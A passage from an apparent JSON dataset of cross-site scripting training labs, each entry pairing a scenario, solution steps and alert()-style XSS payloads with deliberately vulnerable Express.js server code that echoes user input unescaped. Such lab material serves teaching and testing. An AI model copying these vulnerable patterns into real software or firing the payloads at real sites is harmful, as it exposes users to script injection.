      "Solution Steps": [
        "Send a request like /search?query=<img src=x onerror=alert(1)>",
        "Observe the autocomplete box rendering the malicious query",
        "Confirm if payload triggers execution"
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('Autocomplete')</script>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.query || '';\n  res.send(`\n    <html>\n      <body>\n        <input value='${q}' id='searchBox'>\n        <div id='suggestions'>Suggestions for: <b>${q}</b></div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Autocomplete XSS lab running'));\n"
    },
    {
      "Lab scenario": "Stored XSS in User Bio with Unsafe Render",
      "Lab Description": "Users can set their bio on their profile. The server stores this content and later displays it without escaping or sanitizing, making it vulnerable to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Update your profile bio with <script>alert('bio')</script>",
        "Visit the profile view page",
        "Observe if the payload gets executed"
      ],
      "payloads": [
        "<script>alert('bio')</script>",
        "<img src=x onerror=alert('bio')>",
        "<svg/onload=alert('bio')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-bio', (req, res) => {\n  res.send(`<form method='POST'><textarea name='bio'></textarea><button>Save</button></form>`);\n});\n\napp.post('/edit-bio', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.get('/profile', (req, res) => {\n  res.send(`<h2>User Profile</h2><p>${userBio}</p>`);\n});\n\napp.listen(3000, () => console.log('User bio XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS via Unsanitized Image Caption in Gallery",
      "Lab Description": "Users upload images with optional captions. These captions are rendered directly into the gallery view using `innerHTML`. Attackers can upload a benign image with a malicious caption.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload an image and set the caption to <img src=x onerror=alert('caption')>",
        "View the gallery page",
        "Check for script execution from the caption"
      ],
      "payloads": [
        "<img src=x onerror=alert('caption')>",
        "<svg/onload=alert('caption')>",
        "<script>alert('caption')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/upload', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='url' placeholder='Image URL'>\n    <input name='caption' placeholder='Caption'>\n    <button>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', (req, res) => {\n  images.push({ url: req.body.url, caption: req.body.caption });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(img => `<div><img src='${img.url}'><p>${img.caption}</p></div>`).join('');\n  res.send(`<h1>Gallery</h1>${html}`);\n});\n\napp.listen(3000, () => console.log('Gallery XSS lab running'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in Email Preview Template",
      "Lab Description": "The webmail client has a preview feature for incoming emails. It takes query parameters like subject and body to render a mock preview. However, user-supplied values are injected into the DOM without sanitization, leading to reflected XSS.\nTo solve: Inject a script in the body parameter to trigger an alert when the preview is rendered.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the email preview page using URL parameters like ?subject=Hi&body=Hello.",
        "Replace the body value with a payload such as <script>alert('XSS')</script>.",
        "Load the page and observe the reflected payload execution.",
        "Try other payloads to evade potential filters.",
        "Confirm that each page load with malicious input triggers code execution."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const subject = req.query.subject || 'No Subject';\n  const body = req.query.body || 'Empty';\n  res.send(`\n    <html>\n      <body>\n        <h2>Email Preview</h2>\n        <h3>${subject}</h3>\n        <p>${body}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Comment Section of Image Gallery",
      "Lab Description": "An image gallery allows users to comment on pictures. These comments are stored and displayed under the images. The input is not sanitized, leading to persistent XSS on image pages.\nTo solve: Submit a comment with a script payload and revisit the image page to see the script execute.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to an image in the gallery and locate the comment form.",
        "Submit a comment containing a script payload like <script>alert('XSS')</script>.",
        "Reload the page and observe the payload being executed under the image.",
        "Verify persistence by revisiting the page in a different session.",
        "Try alternate payloads to explore filter bypasses."
      ],
      "payloads": [
        "<script>alert('Gallery XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/image', (req, res) => {\n  const commentHTML = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Image Gallery</h2>\n        <img src='cat.jpg' width='200'/>\n        <h3>Comments</h3>\n        ${commentHTML}\n        <form method='POST' action='/comment'>\n          <input name='text' placeholder='Leave a comment'/>\n          <button>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/image');\n});\n\napp.listen(3000, () => console.log('Server running'));\n"
    },
    {
      "Lab scenario": "DOM-based XSS in Notification Renderer",
      "Lab Description": "The application fetches notifications from localStorage and renders them inside an alert panel. The values are inserted into the DOM with innerHTML, making it vulnerable to DOM-based XSS.\nTo solve: Inject a malicious payload via localStorage and reload the app to trigger execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the browser console and set a malicious value: localStorage.setItem('notif', '<img src=x onerror=alert(1)>').",
        "Reload the page and check the notifications panel.",
        "Observe the payload being executed.",
        "Try obfuscated or encoded payloads for bypass testing.",
        "Verify that each load with the crafted localStorage value leads to XSS."
      ],
      "payloads": [
        "<script>alert('Notification XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Dashboard</h2>\n        <div id='alerts'></div>\n        <script>\n          const msg = localStorage.getItem('notif');\n          if (msg) {\n            document.getElementById('alerts').innerHTML = msg;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in Redirect URL",
      "Lab Description": "The login page accepts a `redirect` parameter in the URL to know where to send users after login. However, the parameter is directly embedded in the page without sanitization, enabling reflected XSS.\nTo solve: Craft a redirect value containing a script and observe it executing when the login page loads.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to /login?redirect=<script>alert('XSS')</script>.",
        "Observe that the value is reflected inside the HTML.",
        "See the script execute when the page loads.",
        "Try variations like using an image tag payload.",
        "Confirm successful execution before login interaction."
      ],
      "payloads": [
        "<script>alert('Redirect XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const redirectTo = req.query.redirect || '/home';\n  res.send(`\n    <html>\n      <body>\n        <h2>Login Page</h2>\n        <p>After login, you'll be redirected to: ${redirectTo}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Profile Bio Field",
      "Lab Description": "The application lets users customize their profile bio. However, the bio is rendered using innerHTML on the profile page without sanitization. An attacker can inject a persistent XSS payload into their own bio.\nTo solve: Update your profile with a script payload and view your profile page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the profile edit page and update the bio with <script>alert('XSS')</script>.",
        "Save the profile and navigate to your public profile.",
        "Observe that the script executes.",
        "Try alternate payloads for better stealth or filter bypass.",
        "Verify persistent XSS by logging out and back in."
      ],
      "payloads": [
        "<script>alert('Bio XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>${userBio}</p>\n        <form method='POST' action='/update'>\n          <textarea name='bio' placeholder='Enter bio'></textarea>\n          <button>Save</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
    },
    {
      "Lab scenario": "DOM XSS via JSONP Callback in Analytics Dashboard",
      "Lab Description": "A marketing dashboard loads analytics from a third-party endpoint using a JSONP callback. The callback name is passed via the URL and dynamically injected into a script tag using innerHTML. This leads to DOM-based XSS if a malicious callback name is passed.\nTo solve: Inject a payload in the `callback` parameter to execute JavaScript when the page loads the script.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access /dashboard?callback=evilCallback.",
        "Observe that the callback name is inserted unsafely into a script tag.",
        "Replace the value with a payload like \");alert(1);//.",
        "Confirm that the script is executed immediately upon page load.",
        "Check browser console for alert execution."
      ],
      "payloads": [
        "\");alert('JSONP XSS');//",
        "x\"><script>alert('XSS')</script>",
        "test);</script><script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/dashboard', (req, res) => {\n  const callback = req.query.callback || 'defaultCallback';\n  res.send(`\n    <html>\n      <body>\n        <h2>Marketing Analytics</h2>\n        <div>Loading metrics...</div>\n        <script>\n          const script = document.createElement('script');\n          script.innerHTML = \"fetch('https://api.example.com/data?callback=${callback}')\";\n          document.body.appendChild(script);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via File Name Injection in File Upload Success Page",
      "Lab Description": "A file upload endpoint returns a success message including the file name, which is reflected into the HTML without escaping. An attacker can upload a file with a crafted name containing script code to trigger XSS when users view the upload confirmation.\nTo solve: Upload a file with an XSS payload in the filename.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload a file named <img src=x onerror=alert('XSS')>.png.",
        "After upload, the server redirects to /upload-success?name=<payload>.",
        "Observe the filename rendered directly into the HTML.",
        "Confirm script execution when upload is completed.",
        "Verify that any user previewing the file sees the XSS."
      ],
      "payloads": [
        "<img src=x onerror=alert('File XSS')>.png",
        "<svg/onload=alert('File XSS')>.jpg",
        "<script>alert('File')</script>.txt"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const fileName = req.file.originalname;\n  res.redirect('/upload-success?name=' + encodeURIComponent(fileName));\n});\n\napp.get('/upload-success', (req, res) => {\n  const name = req.query.name || 'unknown';\n  res.send(`\n    <html>\n      <body>\n        <h2>Upload Successful</h2>\n        <p>File uploaded: ${name}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via WebSocket Chat Broadcast",
      "Lab Description": "A real-time chat system uses WebSocket to broadcast messages. The server relays all messages to connected clients without any sanitization, and the frontend renders them using `innerHTML`. This leads to reflected XSS through chat messages.\nTo solve: Send a message containing a script payload through WebSocket and observe execution on other clients.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the chat client and connect to WebSocket.",
        "Send a message like <img src=x onerror=alert('XSS')>.",
        "Ensure other clients or a second tab is connected.",
        "Observe that the message is rendered directly into the DOM.",
        "Confirm that XSS is executed in all receiving sessions."
      ],
      "payloads": [
        "<img src=x onerror=alert('Chat XSS')>",
        "<svg/onload=alert('Chat')>",
        "<script>alert('WebSocket XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Chat</h2>\n        <div id='chat'></div>\n        <input id='msg' /><button onclick='sendMsg()'>Send</button>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = (e) => {\n            document.getElementById('chat').innerHTML += '<div>' + e.data + '</div>';\n          };\n          function sendMsg() {\n            ws.send(document.getElementById('msg').value);\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\nwss.on('connection', ws => {\n  ws.on('message', msg => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\nserver.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS in PDF Viewer via Document Title Injection",
      "Lab Description": "The app uses an embedded PDF viewer that shows the document title in the page header. The title is passed via URL query and injected into the DOM without escaping. XSS is triggered when users view a document with a malicious title.\nTo solve: Craft a malicious URL with a script in the `title` parameter.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access /viewer?title=<script>alert('XSS')</script>.",
        "Observe the title displayed at the top of the viewer.",
        "Confirm the script executes when the page loads.",
        "Verify that the title is not sanitized before rendering.",
        "Use different encodings or tag variants to test filter evasion."
      ],
      "payloads": [
        "<script>alert('PDF XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('PDF XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/viewer', (req, res) => {\n  const title = req.query.title || 'Document';\n  res.send(`\n    <html>\n      <body>\n        <h1>${title}</h1>\n        <iframe src='/sample.pdf' width='100%' height='500px'></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "Stored XSS in Dynamic Survey System",
      "Lab Description": "A feedback survey stores user responses, including free-text answers, and displays them to admins for review. The stored answers are rendered without sanitization, allowing stored XSS if a malicious user submits a script payload.\nTo solve: Submit a survey response with a script, then view the results as an admin.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Fill in the survey with an XSS payload in a text field.",
        "Submit the survey and log in as an admin.",
        "Navigate to the response review panel.",
        "Observe the payload executing in the results view.",
        "Confirm that it persists and executes for every admin viewing it."
      ],
      "payloads": [
        "<script>alert('Survey XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('Survey')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet responses = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/survey', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/submit'>\n          <label>Feedback:</label>\n          <input name='feedback' />\n          <button>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  responses.push(req.body.feedback);\n  res.send('Thanks for your feedback!');\n});\n\napp.get('/admin', (req, res) => {\n  const all = responses.map(r => `<p>${r}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Survey Results</h2>\n        ${all}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via SVG Image Editor Export Feature",
      "Lab Description": "The application includes a browser-based SVG image editor that allows users to export their work. The exported SVG is displayed directly using innerHTML without validation. An attacker can craft a malicious SVG file with embedded JavaScript to trigger XSS when previewed.\nTo solve: Craft an SVG with an embedded script and upload it, then trigger the preview feature.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a custom SVG file with <script>alert(1)</script> inside.",
        "Upload it using the export/upload functionality.",
        "Trigger the preview view where innerHTML is used to render SVG.",
        "Confirm that the script is executed upon rendering.",
        "Ensure other users previewing the same export also get affected."
      ],
      "payloads": [
        "<svg><script>alert('SVG XSS')</script></svg>",
        "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
        "<svg onload=alert('SVG')></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet exportedSVG = '';\napp.use(bodyParser.text({ type: '*/*' }));\n\napp.post('/export-svg', (req, res) => {\n  exportedSVG = req.body;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>SVG Preview</h2>\n        <div id='svg-container'>${exportedSVG}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "Reflected XSS via Custom 404 Page Search Reflection",
      "Lab Description": "A custom 404 error page reflects the missing URL into the response body for debugging purposes. The application fails to sanitize the reflected path, allowing attackers to inject scripts via the URL, leading to reflected XSS when users land on an invalid link.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit /thispagedoesnotexist<script>alert(1)</script>.",
        "Observe that the 404 page renders the URL back in a <p> tag.",
        "Confirm the injected script executes on page load.",
        "Use encoded variations to bypass basic filters if present.",
        "Ensure the XSS triggers only on invalid URLs."
      ],
      "payloads": [
        "/nonexistent/<script>alert('404')</script>",
        "/oops\"><img src=x onerror=alert('404')>",
        "/error<svg/onload=alert('404')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res) => {\n  const path = req.url;\n  res.status(404).send(`\n    <html>\n      <body>\n        <h2>Page Not Found</h2>\n        <p>Could not find: ${path}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Redirect URL in Email Verification",
      "Lab Description": "The application includes an email verification link with a `next` parameter that dictates where the user will be redirected after confirming their email. This value is also shown as a tooltip or confirmation. An attacker can inject HTML/JS into this parameter, resulting in XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a URL like /verify?token=xyz&next=<script>alert(1)</script>.",
        "Send this to a victim who clicks it expecting a real email verification.",
        "Observe that the `next` value is reflected in the HTML (e.g., in a tooltip or button).",
        "Confirm that the payload is rendered and script executes.",
        "Test with different payloads to identify bypasses."
      ],
      "payloads": [
        "<script>alert('redirect')</script>",
        "<img src=x onerror=alert('verify')>",
        "<svg/onload=alert('verify')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/verify', (req, res) => {\n  const next = req.query.next || '/dashboard';\n  res.send(`\n    <html>\n      <body>\n        <h2>Email Verified</h2>\n        <p>You will be redirected to: ${next}</p>\n        <a href='${next}'>Continue</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Misconfigured React dangerouslySetInnerHTML",
      "Lab Description": "A React-based application uses `dangerouslySetInnerHTML` to render dynamic content for FAQs. An admin can submit new FAQs through a CMS, but the rendered content is not sanitized. An attacker with access to the CMS submits a malicious FAQ that executes code for all frontend users.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access the admin FAQ submission form.",
        "Submit a question or answer containing <script>alert(1)</script>.",
        "On the main site, load the FAQ page where dangerouslySetInnerHTML is used.",
        "Observe that the script executes for all viewers.",
        "Demonstrate stored XSS across user sessions."
      ],
      "payloads": [
        "<script>alert('React')</script>",
        "<img src=x onerror=alert('React XSS')>",
        "<svg/onload=alert('FAQ')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/faq', (req, res) => {\n  const faqHTML = getStoredFAQ(); // e.g., includes <p> tags\n  res.send(`\n    <html>\n      <body>\n        <div id=\"faq-root\"></div>\n        <script>\n          ReactDOM.render(\n            React.createElement('div', { dangerouslySetInnerHTML: { __html: ${JSON.stringify(faqHTML)} } }),\n            document.getElementById('faq-root')\n          );\n        </script>\n      </body>\n    </html>\n  `);\n});"
    },
    {
      "Lab scenario": "XSS in Webhook Tester via Reflected Webhook Event",
      "Lab Description": "A webhook testing tool reflects incoming event data on a dashboard for debugging. It renders event contents in real-time using innerHTML without escaping, allowing attackers to trigger XSS by sending malicious event payloads.\nTo solve: Send a crafted webhook payload with HTML or script tags.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a POST request with JSON body: { \"event\": \"<script>alert(1)</script>\" } to /webhook.",
        "Visit the /events page where the event is displayed.",
        "Observe the script execution due to innerHTML usage.",
        "Confirm that the issue affects any user viewing the dashboard.",
        "Attempt encoded variants if filters are applied."
      ],
      "payloads": [
        "{\"event\": \"<script>alert('webhook')</script>\"}",
        "{\"event\": \"<img src=x onerror=alert('hook')>\"}",
        "{\"event\": \"<svg/onload=alert('hook')>\"}"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet latestEvent = '';\napp.use(bodyParser.json());\n\napp.post('/webhook', (req, res) => {\n  latestEvent = req.body.event;\n  res.send('Received');\n});\n\napp.get('/events', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Webhook Event</h2>\n        <div id='event'>${latestEvent}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Drag-and-Drop HTML Builder",
      "Lab Description": "The application includes a WYSIWYG HTML page builder that allows users to drag and drop elements (like images, buttons, text blocks) to create pages. The builder saves the generated HTML and renders it using innerHTML for previews. This allows attackers to inject malicious elements that execute scripts when viewed.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use the builder to insert an image element with an onerror handler.",
        "Alternatively, drag a 'custom HTML' block and insert a script tag.",
        "Save the design and open the preview link.",
        "Confirm that the preview renders the raw HTML with no filtering.",
        "Trigger the script execution in the preview context."
      ],
      "payloads": [
        "<img src=x onerror=alert('Builder XSS')>",
        "<script>alert('WYSIWYG')</script>",
        "<svg/onload=alert('DragDrop')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet savedHTML = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-design', (req, res) => {\n  savedHTML = req.body.html;\n  res.redirect('/preview-design');\n});\n\napp.get('/preview-design', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Page Preview</h2>\n        <div>${savedHTML}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Real-time Chat Notification Tooltip",
      "Lab Description": "A chat app notifies users of new messages via tooltips on message previews. The tooltips use message content and are rendered using innerHTML for formatting. An attacker can send a specially crafted message to another user that contains an XSS payload executed when the tooltip shows.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a message like: <img src=x onerror=alert(1)> to another user.",
        "That message appears in a preview tooltip on hover.",
        "Observe that the innerHTML used to render the tooltip executes the script.",
        "Confirm XSS occurs in the tooltip context."
      ],
      "payloads": [
        "<img src=x onerror=alert('chat')>",
        "<svg/onload=alert('message')>",
        "<script>alert('tooltip')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet messages = [];\n\napp.get('/send', (req, res) => {\n  messages.push(req.query.msg);\n  res.redirect('/inbox');\n});\n\napp.get('/inbox', (req, res) => {\n  const previews = messages.map(m => `<div class='tooltip' onmouseover=\"this.setAttribute('title', '${m}')\">${m}</div>`).join('<br>');\n  res.send(`\n    <html>\n      <body><h2>Inbox</h2>${previews}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Third-Party Comment Embed with Markup Support",
      "Lab Description": "A news site uses a third-party comment plugin that allows limited HTML tags for formatting. However, the sanitization process fails to properly strip event handlers in allowed tags. This can be exploited to inject XSS via seemingly allowed markup like `<b onmouseover>`.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Post a comment using <b onmouseover=alert(1)>Hover me</b>.",
        "View the comment section on a public article.",
        "Move the mouse over the bold text to trigger the alert.",
        "Confirm stored XSS due to event handler bypassing sanitization."
      ],
      "payloads": [
        "<b onmouseover=alert('comment')>Hover</b>",
        "<i onclick=alert('comment')>Click</i>",
        "<u onfocus=alert('focus') tabindex=0>Focus Me</u>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/article');\n});\n\napp.get('/article', (req, res) => {\n  const renderedComments = comments.join('<br>');\n  res.send(`\n    <html>\n      <body>\n        <h2>Breaking News</h2>\n        <div id='comments'>${renderedComments}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "DOM XSS via Dynamic Profile Tabs",
      "Lab Description": "The user profile page uses client-side JavaScript to dynamically switch between tabs (Posts, Info, Settings). Tab names are passed via URL hash and directly injected into the DOM without validation. An attacker can craft a malicious URL that injects a script through the hash.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to /profile#<img src=x onerror=alert(1)>. Observe script execution.",
        "The client-side JS parses location.hash and uses innerHTML or insertAdjacentHTML.",
        "Test variations using DOM injection vectors.",
        "Confirm that simply changing the hash triggers XSS."
      ],
      "payloads": [
        "#<script>alert('hash')</script>",
        "#<img src=x onerror=alert('hash')>",
        "#<svg/onload=alert('hash')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "app.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Profile</h2>\n        <div id='tab-content'></div>\n        <script>\n          const tab = location.hash.substring(1);\n          document.getElementById('tab-content').innerHTML = tab;\n        </script>\n      </body>\n    </html>\n  `);\n});"
    },
    {
      "Lab scenario": "XSS in Language Switcher via Localized JSON Injection",
      "Lab Description": "The web app supports multiple languages and loads localized JSON files dynamically based on a `lang` parameter in the URL. The chosen language file is parsed and rendered into the DOM without filtering. An attacker can inject malicious content by tampering with the language file or abusing the input.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify the lang parameter to point to a malicious or modified language JSON.",
        "Craft translation content like: { \"greeting\": \"<script>alert('XSS')</script>\" }.",
        "Observe the rendering of the greeting message in the UI.",
        "Confirm script execution on page load.",
        "Explore if lang is user-controllable (e.g., via URL or cookie)."
      ],
      "payloads": [
        "{\"greeting\": \"<script>alert('i18n')</script>\"}",
        "{\"greeting\": \"<img src=x onerror=alert('lang')>\"}",
        "{\"greeting\": \"<svg/onload=alert('lang')>\"}"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/translate', (req, res) => {\n  const lang = req.query.lang || 'en';\n  const content = JSON.parse(fs.readFileSync(`./lang/${lang}.json`));\n  res.send(`\n    <html>\n      <body>\n        <h2>${content.greeting}</h2>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS via Markdown Rendering in Internal Wiki",
      "Lab Description": "An internal documentation tool allows employees to create wiki pages using Markdown. The Markdown parser supports raw HTML for flexibility, but no sanitization is applied before rendering. This allows attackers to inject raw HTML and JavaScript, leading to stored XSS across internal teams.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a new wiki page with raw HTML inside the Markdown: `<script>alert(1)</script>`.",
        "Save and navigate to the page view.",
        "Confirm that the script is rendered and executed directly.",
        "Test variations like <img> and <svg> inside markdown content.",
        "Verify that stored XSS affects other users accessing the page."
      ],
      "payloads": [
        "<script>alert('markdown')</script>",
        "<img src=x onerror=alert('markdown')>",
        "<svg/onload=alert('wiki')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\nlet wikiPages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create', (req, res) => {\n  wikiPages.push(req.body.content);\n  res.redirect('/wiki');\n});\n\napp.get('/wiki', (req, res) => {\n  const content = wikiPages.map(c => marked(c)).join('<hr>');\n  res.send(`<html><body>${content}</body></html>`);\n});\n\napp.listen(3000);\n"
    },
    {
      "Lab scenario": "XSS in Interactive Data Dashboard Filters",
      "Lab Description": "A financial dashboard allows users to create custom filters for viewing metrics. These filters are stored and reflected into a dynamic URL fragment and into the DOM for preview. Due to improper escaping, attackers can create malicious filters that result in DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a custom filter with a name like <img src=x onerror=alert(1)>. ",
        "Save and load the dashboard with the filter active.",
        "Inspect the DOM where the filter name is displayed (likely via innerHTML).",
        "Confirm that script execution occurs upon loading or interaction."
      ],
      "payloads": [
        "<script>alert('filter')</script>",
        "<img src=x onerror=alert('dashboard')>",
        "<svg/onload=alert('filters')>"
      ],
      "Vulnerability name": "Cross-site scripting",
